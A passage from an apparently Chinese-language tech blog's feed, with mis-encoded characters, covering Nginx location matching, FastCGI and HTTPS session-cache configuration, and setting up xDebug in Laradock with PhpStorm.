index.htm;</span></span><br><span class="line">    <span class="comment">#    &#125;</span></span><br><span class="line">    <span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># HTTPS server</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment">#server &#123;</span></span><br><span class="line">    <span class="comment">#    listen       443 ssl;</span></span><br><span class="line">    <span class="comment">#    server_name  localhost;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#    ssl_certificate      cert.pem;</span></span><br><span class="line">    <span class="comment">#    ssl_certificate_key  cert.key;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#    ssl_session_cache    shared:SSL:1m;</span></span><br><span class="line">    <span class="comment">#    ssl_session_timeout  5m;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#    ssl_ciphers  HIGH:!aNULL:!MD5;</span></span><br><span class="line">    <span class="comment">#    ssl_prefer_server_ciphers  on;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#    location / &#123;</span></span><br><span class="line">    <span class="comment">#        root   html;</span></span><br><span class="line">    <span class="comment">#        index  index.html index.htm;</span></span><br><span class="line">    <span class="comment">#    &#125;</span></span><br><span class="line">    <span class="comment">#&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="location-çš„åŒ¹é…è§„åˆ™"><a href="#location-çš„åŒ¹é…è§„åˆ™" class="headerlink" title="location çš„åŒ¹é…è§„åˆ™"></a>location çš„åŒ¹é…è§„åˆ™</h2><p>ä¼˜å…ˆçº§ä¾æ¬¡é™ä½ï¼š</p><h3 id="1-æ™®é€šå­—ç¬¦ç²¾ç¡®åŒ¹é…ï¼Œä»¥ä¸‹è§„åˆ™ä»…http-localhost-aå¯ä»¥åŒ¹é…"><a href="#1-æ™®é€šå­—ç¬¦ç²¾ç¡®åŒ¹é…ï¼Œä»¥ä¸‹è§„åˆ™ä»…http-localhost-aå¯ä»¥åŒ¹é…" class="headerlink" title="1. =  æ™®é€šå­—ç¬¦ç²¾ç¡®åŒ¹é…ï¼Œä»¥ä¸‹è§„åˆ™ä»…http://localhost/aå¯ä»¥åŒ¹é…"></a>1. <code>=</code>  æ™®é€šå­—ç¬¦ç²¾ç¡®åŒ¹é…ï¼Œä»¥ä¸‹è§„åˆ™ä»…<code>http://localhost/a</code>å¯ä»¥åŒ¹é…</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location = /a &#123;</span><br><span class="line">    echo <span class="string">"ä¸¥æ ¼åŒ¹é…"</span>ï¼›</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-æ™®é€šå­—ç¬¦åŒ¹é…ï¼Œä»¥ä¸‹è§„åˆ™å¯ä»¥åŒ¹é…http-localhost-aï¼Œhttp-localhost-a-b-c"><a href="#2-æ™®é€šå­—ç¬¦åŒ¹é…ï¼Œä»¥ä¸‹è§„åˆ™å¯ä»¥åŒ¹é…http-localhost-aï¼Œhttp-localhost-a-b-c" class="headerlink" title="2. ^~ æ™®é€šå­—ç¬¦åŒ¹é…ï¼Œä»¥ä¸‹è§„åˆ™å¯ä»¥åŒ¹é…http://localhost/aï¼Œhttp://localhost/a/b/c"></a>2. <code>^~</code> æ™®é€šå­—ç¬¦åŒ¹é…ï¼Œä»¥ä¸‹è§„åˆ™å¯ä»¥åŒ¹é…<code>http://localhost/a</code>ï¼Œ<code>http://localhost/a/b/c</code></h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location ^~ /a &#123;</span><br><span class="line">    echo <span class="string">"éæ­£åˆ™åŒ¹é…"</span>ï¼›</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šå¸¸ç”¨äºåŒ¹é…ç›®å½•</p><h3 id="3-è¡¨ç¤ºåŒºåˆ†å¤§å°å†™çš„æ­£åˆ™åŒ¹é…ï¼Œä»¥ä¸‹è§„åˆ™å¯ä»¥åŒ¹é…http-localhost-b"><a href="#3-è¡¨ç¤ºåŒºåˆ†å¤§å°å†™çš„æ­£åˆ™åŒ¹é…ï¼Œä»¥ä¸‹è§„åˆ™å¯ä»¥åŒ¹é…http-localhost-b" class="headerlink" title="3. ~ è¡¨ç¤ºåŒºåˆ†å¤§å°å†™çš„æ­£åˆ™åŒ¹é…ï¼Œä»¥ä¸‹è§„åˆ™å¯ä»¥åŒ¹é…http://localhost/b"></a>3. <code>~</code> è¡¨ç¤ºåŒºåˆ†å¤§å°å†™çš„æ­£åˆ™åŒ¹é…ï¼Œä»¥ä¸‹è§„åˆ™å¯ä»¥åŒ¹é…<code>http://localhost/b</code></h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location ~ ^/\w &#123;</span><br><span class="line">    echo <span class="string">"æ­£åˆ™åŒ¹é…"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>~*</code>è¡¨ç¤ºæ‰§è¡Œä¸€ä¸ªä¸åŒºåˆ†å¤§å°å†™çš„æ­£åˆ™åŒ¹é…ã€‚</p><h3 id="4-åŒ¹é…ä»»ä½•è¯·æ±‚"><a href="#4-åŒ¹é…ä»»ä½•è¯·æ±‚" class="headerlink" title="4. / åŒ¹é…ä»»ä½•è¯·æ±‚"></a>4. <code>/</code> åŒ¹é…ä»»ä½•è¯·æ±‚</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location ~ ^/\w &#123;</span><br><span class="line">    echo <span class="string">"æ­£åˆ™åŒ¹é…"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-å®šä¹‰ä¸€ä¸ªå‘½åçš„-locationï¼Œä½¿ç”¨åœ¨å†…éƒ¨å®šå‘æ—¶ï¼Œä¾‹å¦‚-error-page-try-files"><a href="#5-å®šä¹‰ä¸€ä¸ªå‘½åçš„-locationï¼Œä½¿ç”¨åœ¨å†…éƒ¨å®šå‘æ—¶ï¼Œä¾‹å¦‚-error-page-try-files" class="headerlink" title="5.  @ å®šä¹‰ä¸€ä¸ªå‘½åçš„ locationï¼Œä½¿ç”¨åœ¨å†…éƒ¨å®šå‘æ—¶ï¼Œä¾‹å¦‚ error_page, try_files"></a>5.  <code>@</code> å®šä¹‰ä¸€ä¸ªå‘½åçš„ locationï¼Œä½¿ç”¨åœ¨å†…éƒ¨å®šå‘æ—¶ï¼Œä¾‹å¦‚ error_page, try_files</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">error_page <span class="number">404</span> = @fetch;</span><br><span class="line"></span><br><span class="line">location @fetch &#123;</span><br><span class="line">    proxy_pass http://fetch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒä¸€ä¼˜å…ˆçº§ï¼ŒåŒ¹é…ç¨‹åº¦è¾ƒé«˜çš„æœ‰é™åŒ¹é…ï¼›åŒ¹é…ç¨‹åº¦ç›¸åŒï¼Œåˆ™æ ¹æ®é…ç½®ä¼˜å…ˆçº§åŒ¹é…</p><p>FastCGI ä»£ç†<br>ä¸FastCGIä¸€èµ·ä½¿ç”¨çš„æ˜¯<code>fastcgi_pass</code>ï¼Œè€Œä¸æ˜¯<code>proxy_pass</code>ã€‚</p><p>PHP çš„ Nginx é…ç½®è§£æ<br><a href="https://nginx.org/en/docs/http/request_processing.html#simple_php_site_configuration" target="_blank" rel="noopener">https://nginx.org/en/docs/http/request_processing.html#simple_php_site_configuration</a></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>      <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> example.org www.example.org;</span><br><span class="line">    <span class="attribute">root</span>        /data/www;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">index</span>   index.html index.php;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~* \.(gif|jpg|png)$</span> &#123;</span><br><span class="line">        <span class="attribute">expires</span> <span class="number">30d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">        <span class="attribute">fastcgi_pass</span>  localhost:<span class="number">9000</span>;</span><br><span class="line">        <span class="attribute">fastcgi_param</span> SCRIPT_FILENAME</span><br><span class="line">                      <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">        <span class="attribute">include</span>       fastcgi_params;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fastcgi_paramå‚æ•°ä¸­çš„<code>$document_root</code>ç­‰åŒäº<code>root</code>æŒ‡å‘çš„è·¯å¾„ï¼Œè€Œ<code>$fastcgi_script_name</code>åˆ™ç­‰åŒäºè¯·æ±‚çš„ URIï¼Œæ¯”å¦‚<code>/index.php</code>ã€‚</p><h1 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h1><p><a href="https://nginx.org/en/docs/http/configuring_https_servers.html" target="_blank" rel="noopener">https://nginx.org/en/docs/http/configuring_https_servers.html</a><br><a href="https://aotu.io/notes/2016/08/16/nginx-https/index.html" target="_blank" rel="noopener">https://aotu.io/notes/2016/08/16/nginx-https/index.html</a><br>å‡å°‘ CPU è¿ç®—é‡<br>SSL çš„è¿è¡Œè®¡ç®—éœ€è¦æ¶ˆè€—é¢å¤–çš„ CPU èµ„æºï¼Œä¸€èˆ¬å¤šæ ¸å¤„ç†å™¨ç³»ç»Ÿä¼šè¿è¡Œå¤šä¸ªå·¥ä½œè¿›ç¨‹(worker processes )ï¼Œè¿›ç¨‹çš„æ•°é‡ä¸ä¼šå°‘äºå¯ç”¨çš„ CPU æ ¸æ•°ã€‚SSL é€šè®¯è¿‡ç¨‹ä¸­æ¡æ‰‹é˜¶æ®µçš„è¿ç®—æœ€å ç”¨ CPU èµ„æºï¼Œæœ‰ä¸¤ä¸ªæ–¹æ³•å¯ä»¥å‡å°‘æ¯å°å®¢æˆ·ç«¯çš„è¿ç®—é‡ï¼š</p><ol><li>æ¿€æ´» keepalive é•¿è¿æ¥ï¼Œä¸€ä¸ªè¿æ¥å‘é€æ›´å¤šä¸ªè¯·æ±‚</li><li>å¤ç”¨ SSL ä¼šè¯å‚æ•°ï¼Œåœ¨å¹¶è¡Œå¹¶å‘çš„è¿æ¥æ•°ä¸­é¿å…è¿›è¡Œå¤šæ¬¡ SSLæ¡æ‰‹<br>è¿™äº›ä¼šè¯ä¼šå­˜å‚¨åœ¨ä¸€ä¸ª SSL ä¼šè¯ç¼“å­˜é‡Œé¢ï¼Œé€šè¿‡å‘½ä»¤ <code>ssl_session_cache</code> é…ç½®ï¼Œå¯ä»¥ä½¿ç¼“å­˜åœ¨æœºå™¨é—´å…±äº«ï¼Œç„¶ååˆ©ç”¨å®¢æˆ·ç«¯åœ¨æ¡æ‰‹é˜¶æ®µä½¿ç”¨çš„ seesion id å»æŸ¥è¯¢æœåŠ¡ç«¯çš„ session cathe(å¦‚æœæœåŠ¡ç«¯è®¾ç½®æœ‰çš„è¯)ï¼Œç®€åŒ–æ¡æ‰‹é˜¶æ®µã€‚</li></ol><p>1M çš„ä¼šè¯ç¼“å­˜å¤§æ¦‚åŒ…å« 4000 å€‹ä¼šè¯ï¼Œé»˜è®¤çš„ç¼“å­˜è¶…æ—¶æ—¶é—´ä¸º 5 åˆ†é’Ÿï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨ <code>ssl_session_timeout</code> å‘½ä»¤è®¾ç½®ç¼“å­˜è¶…æ—¶æ—¶é—´ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªæ‹¥æœ‰ 10M å…±äº«ä¼šè¯ç¼“å­˜çš„å¤šæ ¸ç³»ç»Ÿä¼˜åŒ–é…ç½®ä¾‹å­ï¼š</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">worker_processes</span> <span class="string">auto;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">http</span> <span class="string">&#123;</span></span><br><span class="line">    <span class="attr">ssl_session_cache</span>   <span class="string">shared:SSL:10m;</span></span><br><span class="line">    <span class="attr">ssl_session_timeout</span> <span class="string">10m;</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">server</span> <span class="string">&#123;</span></span><br><span class="line">        <span class="attr">listen</span>              <span class="string">443 ssl;</span></span><br><span class="line">        <span class="attr">server_name</span>         <span class="string">www.example.com;</span></span><br><span class="line">        <span class="attr">keepalive_timeout</span>   <span class="string">70;</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">ssl_certificate</span>     <span class="string">www.example.com.crt;</span></span><br><span class="line">        <span class="attr">ssl_certificate_key</span> <span class="string">www.example.com.key;</span></span><br><span class="line">        <span class="attr">ssl_protocols</span>       <span class="string">TLSv1 TLSv1.1 TLSv1.2;</span></span><br><span class="line">        <span class="attr">ssl_ciphers</span>         <span class="string">HIGH:!aNULL:!MD5;</span></span><br><span class="line">        <span class="attr">...</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>openssl s_client -connect www.godaddy.com:443</code> å‘½ä»¤å¯éªŒè¯æœåŠ¡å™¨å‘é€çš„è¯ä¹¦æ˜¯å¦å®Œæ•´ã€‚</p><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><ol><li><a href="https://nginx.org/en/docs/" target="_blank" rel="noopener">Nginx Documentation</a></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Laradock é…ç½® xDebug</title>
      <link href="/post/laradock-with-xDebug/"/>
      <url>/post/laradock-with-xDebug/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/007S8ZIlly1geaog4xemrj30xc0i7wg2.jpg" alt=""></p><a id="more"></a><h1 id="1-é…ç½®-Laradock"><a href="#1-é…ç½®-Laradock" class="headerlink" title="1. é…ç½® Laradock"></a>1. é…ç½® Laradock</h1><h2 id="1-1-ä¿®æ”¹-laradock-env"><a href="#1-1-ä¿®æ”¹-laradock-env" class="headerlink" title="1.1 ä¿®æ”¹ laradock/.env"></a>1.1 ä¿®æ”¹ laradock/.env</h2><p>æ‰“å¼€ <code>.env</code> æ–‡ä»¶ï¼Œä¿®æ”¹ä¸‹åˆ—é…ç½®é¡¹ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">WORKSPACE_INSTALL_XDEBUG</span>=<span class="literal">true</span></span><br><span class="line"><span class="attr">PHP_FPM_INSTALL_XDEBUG</span>=<span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="1-2-é…ç½®laradock-php-fpm-xdebug-ini"><a href="#1-2-é…ç½®laradock-php-fpm-xdebug-ini" class="headerlink" title="1.2 é…ç½®laradock/php-fpm/xdebug.ini"></a>1.2 é…ç½®laradock/php-fpm/xdebug.ini</h2><p>php-fpm ç”¨äºè°ƒè¯• php çš„æœåŠ¡å™¨æ¨¡å¼ï¼ŒåŸºäºæµè§ˆå™¨è¯·æ±‚</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; <span class="doctag">NOTE:</span> The actual debug.so extention is NOT SET HERE but rather (/usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; phpstorm [æ–‡æ¡£](https://www.jetbrains.com/help/phpstorm/2020.1/configuring-xdebug.html?utm_campaign=PS&amp;utm_content=2020.1&amp;utm_medium=link&amp;utm_source=product#configuring-xdebug-docker)ä¸­æåˆ°ï¼Œåœ¨ docker ä¸­ä½¿ç”¨`host.docker.internal`ä¼šè‡ªåŠ¨è§£æä¸ºå†…ç½‘åœ°å€ï¼Œæ— éœ€æ›´æ”¹ä¸º`docker.for.win.localhost`æˆ–`docker.for.mac.localhost`</span></span><br><span class="line"><span class="attr">xdebug.remote_host</span>=<span class="string">"host.docker.internal"</span></span><br><span class="line"><span class="attr">xdebug.remote_connect_back</span>=<span class="number">0</span></span><br><span class="line"><span class="comment">; ä¿®æ”¹é»˜è®¤ç«¯å£å· 9000 ä¸º 9001ï¼Œ9000 ä¸ php-fpm ç«¯å£å·å†²çª</span></span><br><span class="line"><span class="attr">xdebug.remote_port</span>=<span class="number">9001</span></span><br><span class="line"><span class="attr">xdebug.idekey</span>=PHPSTORM</span><br><span class="line"></span><br><span class="line"><span class="comment">; å¼€å¯</span></span><br><span class="line"><span class="attr">xdebug.remote_autostart</span>=<span class="number">1</span></span><br><span class="line"><span class="comment">; å¼€å¯</span></span><br><span class="line"><span class="attr">xdebug.remote_enable</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">xdebug.cli_color</span>=<span class="number">0</span></span><br><span class="line"><span class="attr">xdebug.profiler_enable</span>=<span class="number">0</span></span><br><span class="line"><span class="attr">xdebug.profiler_output_dir</span>=<span class="string">"~/xdebug/phpstorm/tmp/profiling"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">xdebug.remote_handler</span>=dbgp</span><br><span class="line"><span class="attr">xdebug.remote_mode</span>=req</span><br><span class="line"></span><br><span class="line"><span class="attr">xdebug.var_display_max_children</span>=-<span class="number">1</span></span><br><span class="line"><span class="attr">xdebug.var_display_max_data</span>=-<span class="number">1</span></span><br><span class="line"><span class="attr">xdebug.var_display_max_depth</span>=-<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="1-3-é…ç½®-laradock-workspace-xdebug-ini"><a href="#1-3-é…ç½®-laradock-workspace-xdebug-ini" class="headerlink" title="1.3 é…ç½® laradock/workspace/xdebug.ini"></a>1.3 é…ç½® laradock/workspace/xdebug.ini</h2><p>workspace ç”¨äºè°ƒè¯• php çš„å‘½ä»¤è¡Œæ¨¡å¼</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; <span class="doctag">NOTE:</span> The actual debug.so extention is NOT SET HERE but rather (/usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">xdebug.remote_host</span>=<span class="string">"host.docker.internal"</span></span><br><span class="line"><span class="attr">xdebug.remote_connect_back</span>=<span class="number">0</span></span><br><span class="line"><span class="attr">xdebug.remote_port</span>=<span class="number">9001</span></span><br><span class="line"><span class="attr">xdebug.idekey</span>=PHPSTORM</span><br><span class="line"></span><br><span class="line"><span class="attr">xdebug.remote_autostart</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">xdebug.remote_enable</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">xdebug.cli_color</span>=<span class="number">0</span></span><br><span class="line"><span class="attr">xdebug.profiler_enable</span>=<span class="number">0</span></span><br><span class="line"><span class="attr">xdebug.profiler_output_dir</span>=<span class="string">"~/xdebug/phpstorm/tmp/profiling"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">xdebug.remote_handler</span>=dbgp</span><br><span class="line"><span class="attr">xdebug.remote_mode</span>=req</span><br><span class="line"></span><br><span class="line"><span class="attr">xdebug.var_display_max_children</span>=-<span class="number">1</span></span><br><span class="line"><span class="attr">xdebug.var_display_max_data</span>=-<span class="number">1</span></span><br><span class="line"><span class="attr">xdebug.var_display_max_depth</span>=-<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="1-4-é‡æ–°æ„å»º-php-fpm-å’Œ-workspace-å®¹å™¨"><a href="#1-4-é‡æ–°æ„å»º-php-fpm-å’Œ-workspace-å®¹å™¨" class="headerlink" title="1.4 é‡æ–°æ„å»º php-fpm å’Œ workspace å®¹å™¨"></a>1.4 é‡æ–°æ„å»º php-fpm å’Œ workspace å®¹å™¨</h2><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span> docker-compose build --<span class="keyword">no</span>-cache php-fpm workspace</span><br></pre></td></tr></table></figure><h2 id="1-5-é‡æ–°å¯åŠ¨å®¹å™¨"><a href="#1-5-é‡æ–°å¯åŠ¨å®¹å™¨" class="headerlink" title="1.5 é‡æ–°å¯åŠ¨å®¹å™¨"></a>1.5 é‡æ–°å¯åŠ¨å®¹å™¨</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>docker-compose up -d workspace</span><br></pre></td></tr></table></figure><h2 id="1-6-æŸ¥çœ‹-xdebug-æ˜¯å¦å®‰è£…æˆåŠŸ"><a href="#1-6-æŸ¥çœ‹-xdebug-æ˜¯å¦å®‰è£…æˆåŠŸ" class="headerlink" title="1.6 æŸ¥çœ‹ xdebug æ˜¯å¦å®‰è£…æˆåŠŸ"></a>1.6 æŸ¥çœ‹ xdebug æ˜¯å¦å®‰è£…æˆåŠŸ</h2><h3 id="æ–¹å¼ä¸€"><a href="#æ–¹å¼ä¸€" class="headerlink" title="æ–¹å¼ä¸€"></a>æ–¹å¼ä¸€</h3><p>workspace å®¹å™¨ä¸­æŸ¥çœ‹<br><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1geamrq78wgj31440a0tax.jpg" alt=""></p><h3 id="æ–¹å¼äºŒ"><a href="#æ–¹å¼äºŒ" class="headerlink" title="æ–¹å¼äºŒ"></a>æ–¹å¼äºŒ</h3><p>laradock æ ¹ç›®å½•æŸ¥çœ‹ xdebug çŠ¶æ€<br><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1geamtcmlazj30ze08ugnb.jpg" alt=""></p><h2 id="1-7-xdebug-çŠ¶æ€ç®¡ç†"><a href="#1-7-xdebug-çŠ¶æ€ç®¡ç†" class="headerlink" title="1.7 xdebug çŠ¶æ€ç®¡ç†"></a>1.7 xdebug çŠ¶æ€ç®¡ç†</h2><p>åœ¨ laradock æ ¹ç›®å½•æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ç®¡ç† xdebugï¼Œå®‰è£…æˆåŠŸé»˜è®¤å·²å¯åŠ¨</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./php-fpm/xdebug <span class="keyword">start</span>/<span class="keyword">stop</span>/<span class="keyword">status</span></span><br></pre></td></tr></table></figure><h2 id="1-8-ç¡®è®¤-xdebug-é…ç½®å˜æ›´åœ¨å®¹å™¨ä¸­ç”Ÿæ•ˆ"><a href="#1-8-ç¡®è®¤-xdebug-é…ç½®å˜æ›´åœ¨å®¹å™¨ä¸­ç”Ÿæ•ˆ" class="headerlink" title="1.8 ç¡®è®¤ xdebug é…ç½®å˜æ›´åœ¨å®¹å™¨ä¸­ç”Ÿæ•ˆ"></a>1.8 ç¡®è®¤ xdebug é…ç½®å˜æ›´åœ¨å®¹å™¨ä¸­ç”Ÿæ•ˆ</h2><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1geamwyssr8j30qz0ptgpu.jpg" alt=""></p><h1 id="2-é…ç½®-PhpStorm"><a href="#2-é…ç½®-PhpStorm" class="headerlink" title="2. é…ç½® PhpStorm"></a>2. é…ç½® PhpStorm</h1><h2 id="2-1-é…ç½®-debug"><a href="#2-1-é…ç½®-debug" class="headerlink" title="2.1 é…ç½® debug"></a>2.1 é…ç½® debug</h2><p>æ‰“å¼€ <code>Preferences &gt; Languages &amp; Frameworks &gt; PHP</code><br><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gean19m2vxj315f0u0qan.jpg" alt=""></p><h2 id="2-2-é…ç½®-DBGp-Proxy"><a href="#2-2-é…ç½®-DBGp-Proxy" class="headerlink" title="2.2 é…ç½® DBGp Proxy"></a>2.2 é…ç½® DBGp Proxy</h2><p>æ‰“å¼€ <code>Preferences &gt; Languages &amp; Frameworks &gt; PHP &gt; Debug &gt; DBGp Proxy</code><br><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gean1oqrohj315f0u0djm.jpg" alt=""></p><p>æ­¤å¤„çš„<code>IDE key</code>é…ç½®éœ€ä¸<code>xdebug.idekey</code>ä¸€è‡´</p><h2 id="2-3-éªŒè¯é…ç½®"><a href="#2-3-éªŒè¯é…ç½®" class="headerlink" title="2.3 éªŒè¯é…ç½®"></a>2.3 éªŒè¯é…ç½®</h2><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gean49hxhij315f0u0k6x.jpg" alt=""></p><p>å¡«å†™æ ¡éªŒè„šæœ¬åœ°å€æ—¶ï¼Œéœ€æ˜¯é¡¹ç›®æ ¹ç›®å½•ï¼Œå¦‚ laravel æ˜¯ public ç›®å½•ã€‚</p><h2 id="2-4-æ·»åŠ æœåŠ¡å™¨"><a href="#2-4-æ·»åŠ æœåŠ¡å™¨" class="headerlink" title="2.4 æ·»åŠ æœåŠ¡å™¨"></a>2.4 æ·»åŠ æœåŠ¡å™¨</h2><p>æ‰“å¼€ <code>Preferences &gt; Languages &amp; Frameworks &gt; PHP &gt; Server</code><br><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gean77mpifj315f0u0q7w.jpg" alt=""></p><p>ç”±äºé¡¹ç›®æ˜¯åœ¨å®¹å™¨ä¸­è¿è¡Œçš„ï¼Œå› æ­¤éœ€è¦é…ç½®é¡¹ç›®å®¿ä¸»æœºè·¯å¾„ä¸å®¹å™¨è·¯å¾„çš„æ˜ å°„å…³ç³»ã€‚</p><p>æ­¤å¤„å¯é…ç½®å¤šä¸ªæœåŠ¡å™¨ï¼Œé€‚ç”¨äºå¤šä¸ªé¡¹ç›®é—´çš„åˆ‡æ¢ã€‚</p><h2 id="2-5-è®¾ç½®-debug"><a href="#2-5-è®¾ç½®-debug" class="headerlink" title="2.5 è®¾ç½® debug"></a>2.5 è®¾ç½® debug</h2><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1geank0dwq1j31ev0u0qgg.jpg" alt=""></p><h1 id="3-å¼€å§‹-debug"><a href="#3-å¼€å§‹-debug" class="headerlink" title="3. å¼€å§‹ debug"></a>3. å¼€å§‹ debug</h1><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1geanp1ort5j30yx0u011i.jpg" alt=""></p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>å–„ç”¨ xdebugï¼Œä¸ä»…èƒ½æ‘†è„±<code>var_dump()</code>çš„åŸå§‹æ–­ç‚¹è°ƒè¯•ï¼Œæå‡æˆ‘ä»¬çš„å·¥ä½œæ•ˆç‡ï¼Œä¹Ÿèƒ½å¾ˆå¥½çš„è¿½è¸ªä»£ç çš„è°ƒç”¨ï¼Œåœ¨æ’æŸ¥æ•…éšœä¸å­¦ä¹ ä¼˜ç§€æ¡†æ¶æ—¶èƒ½äº‹åŠåŠŸå€ã€‚</p><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><ol><li><a href="https://onthink.com/2019/02/20/mac-laradock-xdebug-phpstorm/" target="_blank" rel="noopener">Laradock é…ç½® xdebug ä¸ phpstorm</a></li><li><a href="https://juejin.im/post/5bdd61986fb9a049ac78960d" target="_blank" rel="noopener">æ¨èä»£ç è°ƒè¯•å·¥å…· 